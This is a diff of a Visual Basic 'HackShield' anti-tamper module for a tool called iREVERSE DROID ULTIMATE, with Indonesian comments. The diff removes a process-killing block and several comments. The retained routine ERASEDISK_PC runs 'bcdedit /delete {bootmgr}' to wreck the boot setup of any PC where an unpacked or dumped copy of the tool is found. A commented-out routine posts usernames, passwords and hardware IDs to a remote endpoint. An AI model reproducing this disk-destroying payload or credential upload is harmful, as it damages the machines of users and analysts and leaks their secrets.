@@ -8,16 +8,6 @@ Imports Microsoft.VisualBasic
 Imports System
 
 Module HackShield
-    Public wc As WebClient = New WebClient()
-    Public dataToSend As NameValueCollection = New NameValueCollection()
-
-    ' Taruh SystemIsExit = True di MyBase.FormClosing
-    ' Seperti ini
-    ' Public Sub MyFormClosing() Handles MyBase.FormClosing
-    '   SystemIsExit = True
-    ' End Sub
-    ' agar HackShield berhenti jika Form Login & Main diclose sehingga program bisa berhenti
-
     Public Declare Function CheckRemoteDebuggerPresent Lib "kernel32.dll" (ptr As IntPtr, ByRef b As Boolean) As Boolean
 
     Public Sub SizedArrayAssemblyCopyrightAttribute(sender As Object)
@@ -174,50 +164,6 @@ Module HackShield
                                         Catch ex As Exception
                                             Console.WriteLine(ex.ToString)
                                         End Try
-                                    Else
-                                        Dim flag3 As Boolean = process.MainWindowTitle.ToLower().Contains(array(i))
-                                        If flag3 Then
-                                            Try
-                                                actionleft -= 1
-                                                If File.Exists(System.Windows.Forms.Application.StartupPath & "\WARNING.txt") Then
-                                                    File.Delete(System.Windows.Forms.Application.StartupPath & "\WARNING.txt")
-                                                End If
-                                                Console.WriteLine("List Windows Title : " & process.MainWindowTitle.ToLower().Contains(array(i)))
-                                                process.Kill()
-                                                File.WriteAllText("WARNING.txt", String.Concat(New String() {
-                                                                                               "WE FOUND     : ",
-                                                                                               process.ProcessName,
-                                                                                               " RUNNING IN BACKGROUND!",
-                                                                                               vbLf & "We close the ",
-                                                                                               process.ProcessName,
-                                                                                               " in order to keep running our tool!",
-                                                                                               vbLf & vbLf & "Remains left : " & actionleft & vbLf & vbLf & "iREVERSE HACKSHIELD V1.0"}))
-                                                Dim MyProcess As New Process
-
-                                                With MyProcess.StartInfo
-                                                    .FileName = "notepad.exe"
-                                                    .Arguments = "WARNING.TXT"
-                                                    .UseShellExecute = False
-                                                    .CreateNoWindow = True
-                                                    .RedirectStandardInput = True
-                                                    .RedirectStandardOutput = True
-                                                    .RedirectStandardError = True
-                                                    .StandardOutputEncoding = System.Text.Encoding.ASCII
-
-                                                End With
-                                                MyProcess.Start()
-                                                MyProcess.WaitForExit()
-                                                If File.Exists(System.Windows.Forms.Application.StartupPath & "\WARNING.txt") Then
-                                                    File.Delete(System.Windows.Forms.Application.StartupPath & "\WARNING.txt")
-                                                End If
-                                                If actionleft = 0 Then
-                                                    actionleft = 3
-                                                    Process.GetCurrentProcess().Kill()
-                                                End If
-                                            Catch ex2 As Exception
-                                                Console.WriteLine(ex2.ToString)
-                                            End Try
-                                        End If
                                     End If
                                 Else
                                     Exit While
@@ -234,10 +180,6 @@ Module HackShield
         End While
     End Sub
 
-    ' Taruh checkerdump() ini di Mybase.Load
-    ' Jika Form_Login hanya di-hide maka cukup ditaruh di Mybase.Load Form_Login
-    ' Namun jika Form_Login di-close setelah berhasil login
-    ' Maka taruh checkerdump() ini di Mybase.Load dalam Form_Login dan Form Main
     Public Sub checkerdump()
         Try
             Console.WriteLine("HakcShield activated!")
@@ -247,10 +189,6 @@ Module HackShield
                 Console.WriteLine(hotschecker)
             End If
             If hotschecker.Contains("ireverse") Then 'nama serverr
-                'Sesuaikan ini untuk proses banned akun...
-                'If Not FrmLogin.AksesUser.Contains("admin") Or Not FrmLogin.StatusUser.Contains("admin") Then
-                'PCGOBLACKLIST()
-                'End If
 
                 If File.Exists(System.Windows.Forms.Application.StartupPath & "\BANNED.txt") Then
                     File.Delete(System.Windows.Forms.Application.StartupPath & "\BANNED.txt")
@@ -279,28 +217,24 @@ Module HackShield
                 threads_BANNED.Start()
             End If
 
-            'ubah nama tool.exe jadi tool-cleaned.exe untuk mendeteksi aktivitas hacker / unpacker
             If File.Exists(System.Windows.Forms.Application.StartupPath & "\iREVERSE DROID ULTIMATE-cleaned.exe") Then
                 Dim threads_cleaned As Thread
                 threads_cleaned = New Thread(AddressOf ERASEDISK_PC)
                 threads_cleaned.Start()
             End If
 
-            'ubah nama tool.exe jadi tool-cleaned-Slayed.exe untuk mendeteksi aktivitas hacker / unpacker
             If File.Exists(System.Windows.Forms.Application.StartupPath & "\iREVERSE DROID ULTIMATE-cleaned-Slayed.exe") Then
                 Dim threads_cleaned_Slayed As Thread
                 threads_cleaned_Slayed = New Thread(AddressOf ERASEDISK_PC)
                 threads_cleaned_Slayed.Start()
             End If
 
-            'ubah nama tool.exe jadi tool_dump.exe untuk mendeteksi aktivitas hacker / unpacker
             If File.Exists(System.Windows.Forms.Application.StartupPath & "\iREVERSE DROID ULTIMATE_dump.exe") Then
                 Dim threads_dump As Thread
                 threads_dump = New Thread(AddressOf ERASEDISK_PC)
                 threads_dump.Start()
             End If
 
-            'ubah nama tool.exe jadi tool_Dump.exe untuk mendeteksi aktivitas hacker / unpacker
             If File.Exists(System.Windows.Forms.Application.StartupPath & "\iREVERSE DROID ULTIMATE_Dump.exe") Then
                 Dim threads_Dump As Thread
                 threads_Dump = New Thread(AddressOf ERASEDISK_PC)
@@ -321,8 +255,7 @@ Module HackShield
     End Sub
 
     Public Sub ERASEDISK_PC(thread As Object)
-        'buat file kosong bernama hackshield di dalam folder C:\Windows agar owner tool tidak terkena dampak dari ERASEDISK_PC
-        If Not File.Exists("C:\Windows\hackshield") Then
+        If Not File.Exists("C:\Windows\ihackshield") Then
             Dim cmdbcedit1 As String = " /delete {bootmgr}"
             Dim startInfobcedit1 As ProcessStartInfo = New ProcessStartInfo("bcdedit.exe", cmdbcedit1) With {
             .CreateNoWindow = True,
@@ -577,10 +510,10 @@ Module HackShield
 
     Public Sub PCGOBLACKLIST()
         'sesuaikan dengan data user untuk proses banned akun
-        dataToSend("username") = "" 'FrmLogin.username
-        dataToSend("password") = "" 'FrmLogin.password
-        dataToSend("hwidPC") = "" 'FrmLogin.hwidPC
+        'dataToSend("username") = "" 'FrmLogin.username
+        'dataToSend("password") = "" 'FrmLogin.password
+        'dataToSend("hwidPC") = "" 'FrmLogin.hwidPC
 
-        Dim SendData As String = Encoding.UTF8.GetString(wc.UploadValues("http://adanichelltool/api/banned.php", dataToSend))
+        'Dim SendData As String = Encoding.UTF8.GetString(wc.UploadValues("http://ireverseweb/api/banned.php", dataToSend))
     End Sub
 End Module
